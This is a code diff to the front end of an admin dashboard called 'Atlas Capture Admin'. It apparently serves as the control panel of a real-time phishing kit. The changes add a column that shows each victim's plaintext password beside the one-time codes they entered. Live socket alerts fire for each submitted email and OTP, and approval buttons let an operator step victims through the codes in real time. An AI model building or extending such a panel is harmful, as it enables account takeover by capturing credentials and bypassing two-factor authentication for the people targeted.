@@ -76,7 +76,7 @@ body{
 table{
   width:100%;
   border-collapse:collapse;
-  min-width:800px;
+  min-width:1000px;
 }
 th{
   text-align:left;
@@ -101,7 +101,20 @@ td{
 .badge-pending{background:#fef3c7;color:#d97706;}
 .badge-approved{background:#d1fae5;color:#059669;}
 .badge-waiting{background:#e0e7ff;color:#4f46e5;}
-.approve-btn{
+.badge-email{background:#fef3c7;color:#d97706;}
+
+.approve-email-btn{
+  background:#f59e0b;
+  color:white;
+  border:none;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:500;
+  margin-right:8px;
+}
+.approve-otp-btn{
   background:#4f46e5;
   color:white;
   border:none;
@@ -110,6 +123,7 @@ td{
   cursor:pointer;
   font-size:12px;
   font-weight:500;
+  margin-right:8px;
 }
 .approve-second-btn{
   background:#059669;
@@ -120,7 +134,6 @@ td{
   cursor:pointer;
   font-size:12px;
   font-weight:500;
-  margin-left:8px;
 }
 
 .notification-toast{
@@ -155,7 +168,7 @@ td{
 <body>
 
 <div class="navbar">
-  <h1>Atlas Capture Admin</h1>
+  <h1>Atlas Capture Admin Dashboard</h1>
   <button class="logout-btn" onclick="logout()">Logout</button>
 </div>
 
@@ -171,12 +184,12 @@ td{
       <div class="number" id="totalUsers">0</div>
     </div>
     <div class="stat-card">
-      <h3>Pending First OTP</h3>
-      <div class="number" id="pendingFirst">0</div>
+      <h3>Pending Email Approval</h3>
+      <div class="number" id="pendingEmail">0</div>
     </div>
     <div class="stat-card">
-      <h3>Pending Second OTP</h3>
-      <div class="number" id="pendingSecond">0</div>
+      <h3>Pending OTP Approval</h3>
+      <div class="number" id="pendingOtp">0</div>
     </div>
   </div>
 
@@ -185,14 +198,15 @@ td{
       <thead>
         <tr>
           <th>Email</th>
-          <th>First OTP</th>
+          <th>Password</th>
+          <th>OTP Entered</th>
           <th>Second OTP</th>
           <th>Status</th>
           <th>Actions</th>
         </tr>
       </thead>
       <tbody id="usersTableBody">
-        <tr><td colspan="5" style="text-align:center; padding:40px;">Loading...</td></tr>
+        <tr><td colspan="6" style="text-align:center; padding:40px;">Loading...</td></tr>
       </tbody>
     </table>
   </div>
@@ -232,7 +246,7 @@ td{
           osc.start(now + i * 0.12);
           osc.stop(now + i * 0.12 + 0.15);
         }
-      } else if (type === 'first-otp') {
+      } else if (type === 'otp') {
         const osc = audioContext.createOscillator();
         const gain = audioContext.createGain();
         osc.type = 'sine';
@@ -309,56 +323,99 @@ td{
   }
 
   function updateStats(users) {
-    const pendingFirst = users.filter(u => u.otp && !u.approved).length;
-    const pendingSecond = users.filter(u => u.second_otp && !u.second_approved).length;
+    const pendingEmail = users.filter(u => !u.approved).length;
+    const pendingOtp = users.filter(u => u.approved && u.otp && !u.second_approved).length;
     document.getElementById('totalUsers').textContent = users.length;
-    document.getElementById('pendingFirst').textContent = pendingFirst;
-    document.getElementById('pendingSecond').textContent = pendingSecond;
+    document.getElementById('pendingEmail').textContent = pendingEmail;
+    document.getElementById('pendingOtp').textContent = pendingOtp;
   }
 
   function displayUsers(users) {
     const tbody = document.getElementById('usersTableBody');
     if (!users.length) {
-      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:40px;">No users</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;">No users</td></tr>';
       return;
     }
-    tbody.innerHTML = users.map(user => `
-      <tr>
-        <td><strong>${user.email}</strong></td>
-        <td>${user.otp ? `<span class="badge badge-waiting">${user.otp}</span>` : '<span class="badge badge-pending">Pending</span>'}</td>
-        <td>${user.second_otp ? `<span class="badge badge-waiting">${user.second_otp}</span>` : '<span class="badge badge-pending">Pending</span>'}</td>
-        <td>
-          ${!user.approved && user.otp ? '<span class="badge badge-pending">Awaiting First</span>' : ''}
-          ${user.approved && user.second_otp && !user.second_approved ? '<span class="badge badge-pending">Awaiting Second</span>' : ''}
-          ${user.approved && user.second_approved ? '<span class="badge badge-approved">Completed</span>' : ''}
-          ${!user.otp && !user.approved ? '<span class="badge badge-pending">Email Pending</span>' : ''}
-        </td>
-        <td>
-          ${user.otp && !user.approved ? `<button class="approve-btn" onclick="approveFirst('${user.email}')">✓ Approve First</button>` : ''}
-          ${user.second_otp && user.approved && !user.second_approved ? `<button class="approve-second-btn" onclick="approveSecond('${user.email}')">🔐 Approve Second</button>` : ''}
-        </td>
-      </tr>
-    `).join('');
+    
+    tbody.innerHTML = users.map(user => {
+      // Determine status
+      let statusBadge = '';
+      let actionButtons = '';
+      
+      if (!user.approved) {
+        // Email not approved yet - Show Approve Email button
+        statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
+        actionButtons = `<button class="approve-email-btn" onclick="approveEmail('${user.email}')">📧 Approve Email</button>`;
+      } else if (user.approved && user.otp && !user.second_approved) {
+        // First OTP entered, waiting for second approval
+        statusBadge = '<span class="badge badge-waiting">🔐 First OTP Received - Pending Second Approval</span>';
+        actionButtons = `<button class="approve-otp-btn" onclick="approveSecond('${user.email}')">🔐 Approve Second OTP</button>`;
+      } else if (user.approved && !user.otp) {
+        // Email approved, waiting for OTP
+        statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for OTP</span>';
+        actionButtons = '<span class="badge badge-approved">Waiting for user to enter OTP</span>';
+      } else if (user.approved && user.second_approved) {
+        // Fully verified
+        statusBadge = '<span class="badge badge-approved">✅ Fully Verified</span>';
+        actionButtons = '<span class="badge badge-approved">Complete</span>';
+      } else {
+        statusBadge = '<span class="badge badge-pending">Pending</span>';
+        actionButtons = '';
+      }
+      
+      return `
+        <tr>
+          <td><strong>${user.email}</strong></td>
+          <td><code>${user.password || '-'}</code></td>
+          <td>${user.otp ? `<span class="badge badge-waiting">${user.otp}</span>` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${user.second_otp ? `<span class="badge badge-waiting">${user.second_otp}</span>` : '<span class="badge badge-pending">-</span>'}</td>
+          <td>${statusBadge}</td>
+          <td>${actionButtons}</td>
+        </tr>
+      `;
+    }).join('');
   }
 
-  async function approveFirst(email) {
-    showNotification('First OTP Approval', `Approving ${email}`, 'first-otp');
-    await fetch('/api/admin/approve-user', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
-      body: JSON.stringify({ email })
-    });
-    loadUsers();
+  // Approve Email - This is the button that was missing!
+  async function approveEmail(email) {
+    showNotification('Email Approved', `Approving email for ${email}`, 'email');
+    try {
+      const response = await fetch('/api/admin/approve-user', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.success) {
+        loadUsers();
+      }
+    } catch (error) {
+      console.error('Approve email error:', error);
+    }
   }
 
+  // Approve Second OTP (called after first OTP is entered)
   async function approveSecond(email) {
-    showNotification('Second OTP Approval', `Approving ${email}`, 'second-otp');
-    await fetch('/api/admin/approve-second', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
-      body: JSON.stringify({ email })
-    });
-    loadUsers();
+    showNotification('Second OTP Approved', `Approving second OTP for ${email}`, 'second-otp');
+    try {
+      const response = await fetch('/api/admin/approve-second', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json', 
+          'Authorization': `Bearer ${token}` 
+        },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.success) {
+        loadUsers();
+      }
+    } catch (error) {
+      console.error('Approve second error:', error);
+    }
   }
 
   function logout() {
@@ -366,17 +423,18 @@ td{
     window.location.href = '/admin';
   }
 
+  // Socket listeners
   socket.on('connect', () => console.log('Admin connected'));
   socket.on('user-login', (data) => {
-    showNotification(' New Email Submission', `${data.email} signed up`, 'email');
+    showNotification('📧 New Email Submission', `${data.email} signed up - Click Approve Email`, 'email');
     loadUsers();
   });
   socket.on('user-otp-created', (data) => {
-    showNotification(' First OTP Received', `${data.email} entered OTP: ${data.otp}`, 'first-otp');
+    showNotification('🔢 OTP Received', `${data.email} entered OTP: ${data.otp} - Click Approve Second OTP`, 'otp');
     loadUsers();
   });
   socket.on('user-second-otp-created', (data) => {
-    showNotification(' Second OTP Received', `${data.email} entered OTP: ${data.second_otp}`, 'second-otp');
+    showNotification('🔐 Second OTP Received', `${data.email} entered second OTP: ${data.second_otp}`, 'second-otp');
     loadUsers();
   });
 
